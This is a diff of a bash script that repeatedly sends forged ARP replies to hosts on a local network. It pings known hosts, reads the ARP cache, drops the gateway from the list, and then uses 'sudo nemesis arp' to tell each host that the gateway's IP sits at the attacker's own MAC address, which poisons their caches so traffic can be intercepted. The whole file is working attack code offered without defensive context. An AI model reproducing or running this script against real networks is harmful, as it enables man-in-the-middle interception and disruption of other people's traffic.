@@ -1,7 +1,5 @@
 #!/bin/bash
-varmac="c8:be:19:8f:1f:3a"	#mac address gateway
 gateway="167.13.0.1"		#ip address gateway
-hgateway="dlinkdrouter"		#hostname gateway
 
 while true
 do
@@ -14,21 +12,29 @@ for ipaddr in `cat .hosts`
 	do
 	ping -c 1 $ipaddr|grep ping | awk -F ' ' '{print $2}'
 	done
+arp -na |grep ether |awk -F ' ' '{print $2, $4}'|awk -F '(' '{print $2}' |awk -F ')' '{print $1, $2}' > .arpcache
+rm .hosts
 hmac_addr=`ifconfig |grep  eth0 | awk -F ' ' '{print $6}'`
-cat .hosts |grep -w -v  $gateway > .tmp
-cat .tmp > .hosts
-cat .hosts |grep -w -v $hgateway >.tmp
-cat .tmp > .hosts
+cat .arpcache |grep -w -v  $gateway > .tmp
+cat .tmp > .arpcache
 rm .tmp
+cat .arpcache|awk -F ' ' '{print $1}' > .arpcachei
+cat .arpcache|awk -F ' ' '{print $2}' |tr '\n' ' ' > .arpcachemac
+rm .arpcache
+i=0
 echo "inject ip address:"
-for addr in `cat .hosts`
+for ipaddr in `cat .arpcachei`
 	do
-	echo $addr
-	sudo nemesis arp -r -d eth0 -S $addr -D $gateway -h $hmac_addr -m $varmac -H $hmac_addr -M $varmac 
+	i=`expr $i + 1`
+	varmac=`cat .arpcachemac |awk -v t=$i -F ' ' '{print $t}'`
+	echo $ipaddr
+	#echo "nemesis arp -r -d eth0 -S $gateway -D $ipaddr -h $hmac_addr -m $varmac -H $hmac_addr -M $varmac"
+	sudo nemesis arp -r -d eth0 -S $gateway -D $ipaddr -h $hmac_addr -m $varmac -H $hmac_addr -M $varmac
 	done
 echo done
 echo sleep 6
-rm .hosts
+rm .arpcachei
+rm .arpcachemac
 sleep 6
 done
 
